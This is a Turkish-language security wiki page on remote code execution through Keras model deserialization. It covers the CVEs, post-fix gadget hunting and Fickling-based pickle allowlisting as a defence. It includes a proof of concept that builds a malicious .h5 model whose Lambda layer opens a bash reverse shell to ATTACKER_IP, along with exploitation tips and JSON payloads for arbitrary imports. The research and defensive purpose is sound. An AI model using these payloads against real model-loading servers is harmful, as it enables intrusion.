# Keras Model Deserialization RCE ve Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına karşı pratik exploitation tekniklerini özetler, native .keras formatının iç yapısını ve attack surface'ini açıklar ve Model File Vulnerabilities (MFVs) ile post-fix gadget'ları bulmak için araştırmacılara yönelik bir toolkit sunar.

## .keras model formatının iç yapısı

Bir .keras dosyası en az şunları içeren bir ZIP archive'dır:<sup>[[1]](#references)</sup>
- metadata.json – genel bilgiler (ör. Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5 içindeki weights

config.json, recursive deserialization sürecini yönetir: Keras module'leri import eder, class/function'ları çözümler ve attacker-controlled dictionary'lerden layer/object'leri yeniden oluşturur.<sup>[[1]](#references)</sup>

Dense layer object'i için örnek snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization şunları gerçekleştirir:<sup>[[1]](#references)</sup>
- module/class_name anahtarları üzerinden Module import ve symbol resolution
- attacker-controlled kwargs ile from_config(...) veya constructor invocation
- iç içe nesnelere (activations, initializers, constraints vb.) recursion

Historically, bu durum config.json oluşturan bir attacker için üç primitive ortaya çıkardı:<sup>[[1]](#references)</sup>
- Hangi modüllerin import edileceğini kontrol etme
- Hangi class/function'ların çözümleneceğini kontrol etme
- constructor/from_config'a aktarılacak kwargs'ları kontrol etme

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config(), python_utils.func_load(...) kullanıyordu; bu işlev attacker bytes verisini base64-decode edip marshal.loads() çağırır. Python unmarshalling code execute edebilir.<sup>[[1]](#references)[[3]](#references)</sup>

Exploit fikri (config.json içinde basitleştirilmiş payload):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras varsayılan olarak safe_mode=True uygular. Lambda içindeki Serialized Python functions, kullanıcı açıkça safe_mode=False ile bu seçeneği devre dışı bırakmadıkça engellenir.<sup>[[1]](#references)</sup>

Notes:
- Legacy formats (daha eski HDF5 kayıtları) veya eski codebase'ler modern kontrolleri uygulamayabilir; bu nedenle victim'lar daha eski loader'lar kullandığında “downgrade” tarzı saldırılar hâlâ uygulanabilir.

## CVE-2025-1550 – Keras ≤ 3.8'de Arbitrary module import

Root cause:
- _retrieve_class_or_fn, config.json'dan alınan attacker-controlled module string'leriyle kısıtlanmamış importlib.import_module() kullanıyordu.
- Impact: Kurulu herhangi bir module'ün (veya attacker'ın sys.path üzerine yerleştirdiği bir module'ün) Arbitrary import edilmesi. Import-time code çalışır, ardından object construction attacker kwargs ile gerçekleşir.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports yalnızca resmi ecosystem modülleriyle sınırlandırılır: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True, güvenli olmayan Lambda serialized-function loading işlemlerini engeller
- Basic type checking: deserialize edilen nesneler beklenen türlerle eşleşmelidir

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Birçok production stack hâlâ legacy TensorFlow-Keras HDF5 model dosyalarını (.h5) kabul etmektedir. Bir attacker, server'ın daha sonra yükleyeceği veya inference çalıştıracağı bir model upload edebilirse, Lambda layer load/build/predict sırasında arbitrary Python çalıştırabilir.<sup>[[7]](#references)</sup>

Deserialize edildiğinde veya kullanıldığında reverse shell çalıştıran malicious bir .h5 oluşturmak için minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notlar ve güvenilirlik ipuçları:
- Tetiklenme noktaları: kod birden fazla kez çalışabilir (ör. katman oluşturma/ilk çağrı, model.load_model ve predict/fit sırasında). Payload'ları idempotent olacak şekilde hazırlayın.<sup>[[7]](#references)</sup>
- Sürüm sabitleme: serialization uyumsuzluklarını önlemek için hedefin TF/Keras/Python sürümleriyle eşleşin. Örneğin hedefte Python 3.8 ve TensorFlow 2.13.1 kullanılıyorsa artifact'leri bu sürümler altında oluşturun.<sup>[[7]](#references)</sup>
- Hızlı ortam replikasyonu:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Doğrulama: os.system("ping -c 1 YOUR_IP") gibi zararsız bir payload, reverse shell'e geçmeden önce çalıştırmayı doğrulamaya yardımcı olur (ör. tcpdump ile ICMP gözlemlenebilir).<sup>[[7]](#references)</sup>

## allowlist içindeki fix sonrası gadget yüzeyi

allowlisting ve safe mode kullanılsa bile izin verilen Keras callables arasında geniş bir yüzey kalır. Örneğin, keras.utils.get_file kullanıcı tarafından seçilebilen konumlara arbitrary URL'leri indirebilir.<sup>[[1]](#references)</sup>

İzin verilen bir işleve başvuran Lambda üzerinden Gadget (serialize edilmiş Python bytecode değil):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Önemli sınırlama:
- Lambda.call(), hedef callable'ı çağırırken input tensor'ını ilk positional argument olarak ekler. Seçilen gadget'lar ekstra bir positional arg'ü tolere etmeli (veya *args/**kwargs kabul etmeli). Bu durum, hangi fonksiyonların kullanılabilir olduğunu sınırlar.<sup>[[1]](#references)</sup>

## AI/ML modelleri için ML pickle import allowlisting (Fickling)

Birçok AI/ML model formatı (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, eski TensorFlow artifact'ları vb.) Python pickle verileri içerir. Saldırganlar, yükleme sırasında RCE veya model swapping elde etmek için pickle GLOBAL import'larını ve object constructor'larını rutin olarak kötüye kullanır. Blacklist tabanlı scanner'lar çoğu zaman yeni veya listelenmemiş tehlikeli import'ları kaçırır.<sup>[[8]](#references)[[14]](#references)</sup>

Pratik bir fail-closed savunma, Python'ın pickle deserializer'ını hook'lamak ve unpickling sırasında yalnızca incelenmiş, zararsız ML ile ilgili import'lara izin vermektir. Trail of Bits'in Fickling'i bu policy'yi uygular ve binlerce public Hugging Face pickle'ından oluşturulmuş, özenle hazırlanmış bir ML import allowlist'i sunar.<sup>[[8]](#references)[[13]](#references)</sup>

“safe” import'lar için security model (araştırma ve pratikten çıkarılan sezgiler): Bir pickle tarafından kullanılan imported symbol'ler aynı anda şunları sağlamalıdır:<sup>[[8]](#references)</sup>
- Kod çalıştırmamalı veya çalıştırılmasına neden olmamalı (compiled/source code object'leri, shelling out, hook'lar vb. olmamalı)
- Arbitrary attribute veya item'ları almamalı/ayarlamamalı
- Pickle VM içinden diğer Python object'lerine import yapmamalı veya referans elde etmemeli
- İkincil deserializer'ları (ör. marshal, nested pickle) dolaylı olarak bile tetiklememeli

Fickling protections'ı process startup sırasında mümkün olduğunca erken etkinleştirin; böylece framework'ler tarafından gerçekleştirilen tüm pickle load işlemleri (torch.load, joblib.load vb.) kontrol edilir:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasyonel ipuçları:
- Gerektiğinde hooks'ları geçici olarak devre dışı bırakabilir/yeniden etkinleştirebilirsiniz:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Bilinen güvenilir bir model engellenirse, sembolleri inceledikten sonra ortamınız için allowlist'i genişletin:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling, daha ayrıntılı bir denetim tercih ederseniz genel runtime guard'ları da sunar:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() tüm pickle.load() çağrıları için kontrolleri zorunlu kılar
- Kapsam dahilinde zorunlu uygulama için with fickling.check_safety():
- Tek seferlik kontroller için fickling.load(path) / fickling.is_likely_safe(path)

- Mümkün olduğunda pickle dışı model formatlarını tercih edin (ör. SafeTensors).<sup>[[15]](#references)</sup> pickle kabul etmek zorundaysanız, loader'ları en az yetkiyle, network egress olmadan çalıştırın ve allowlist'i zorunlu kılın.

Bu allowlist-first stratejisinin, uyumluluğu yüksek tutarken yaygın ML pickle exploit yollarını etkili biçimde engellediği gösterilmiştir. ToB benchmark'ında Fickling, sentetik kötü amaçlı dosyaların %100'ünü işaretledi ve önde gelen Hugging Face repolarındaki temiz dosyaların yaklaşık %99'una izin verdi.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) İzin verilen modüllerde sistematik gadget keşfi

keras, keras_nlp, keras_cv, keras_hub genelindeki aday callable'ları listeleyin ve dosya/network/process/env yan etkilerine sahip olanlara öncelik verin.<sup>[[1]](#references)</sup>

<details>
<summary>Allowlist'e eklenmiş Keras modüllerinde potansiyel olarak tehlikeli callable'ları listeleme</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Doğrudan deserialization testi (.keras arşivi gerekmez)

Kabul edilen parametreleri öğrenmek ve yan etkileri gözlemlemek için hazırlanmış dict'leri doğrudan Keras deserializer'larına aktarın.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sürümler arası probing ve formatlar

Keras, farklı güvenlik kontrollerine ve formatlara sahip birden fazla codebase/era içinde bulunur:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, kaldırılması planlanıyor)
- tf-keras: ayrı olarak sürdürülen
- Multi-backend Keras 3 (official): native .keras formatını kullanıma sundu

Regresyonları veya eksik güvenlik kontrollerini ortaya çıkarmak için testleri farklı codebase'ler ve formatlar (.keras ile legacy HDF5) üzerinde tekrarlayın.

## Referanslar

- [1] [Keras Model Deserialization'da Vulnerability Hunting (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Serialization'a kontroller eklendi](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr raporu – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr raporu – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE'den root'a](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling'in yeni AI/ML pickle file scanner'ı](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML ortamlarını güvenli hale getirme (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
